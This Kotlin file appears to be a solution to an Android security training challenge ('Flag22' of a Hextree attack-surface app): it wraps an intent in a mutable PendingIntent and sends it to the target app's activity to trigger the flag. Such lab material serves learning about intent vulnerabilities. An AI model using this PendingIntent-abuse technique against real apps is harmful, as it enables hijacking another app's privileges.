package com.pachinko.intentattacksurface.utils

import android.app.Activity
import android.app.ActivityOptions
import android.app.PendingIntent
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Build
import androidx.annotation.RequiresApi

object Flag22 {
    @RequiresApi(Build.VERSION_CODES.UPSIDE_DOWN_CAKE)
    fun getFlag(context: Context) {
        val innerIntent = Intent().apply {
            component = ComponentName(
                "com.pachinko.intentattacksurface",
                "com.pachinko.intentattacksurface.Flag22Activity"
            )
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
        }

        val options = ActivityOptions.makeBasic()
//        options.pendingIntentBackgroundActivityStartMode = ActivityOptions.MODE_BACKGROUND_ACTIVITY_START_ALLOW_ALWAYS
        val pendingIntent = PendingIntent.getActivity(context, 0, innerIntent, PendingIntent.FLAG_MUTABLE, null)
        val intent = Intent().apply {
            component = ComponentName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag22Activity"
            )
            putExtra("PENDING", pendingIntent)
        }
        context.startActivity(intent)
    }
}
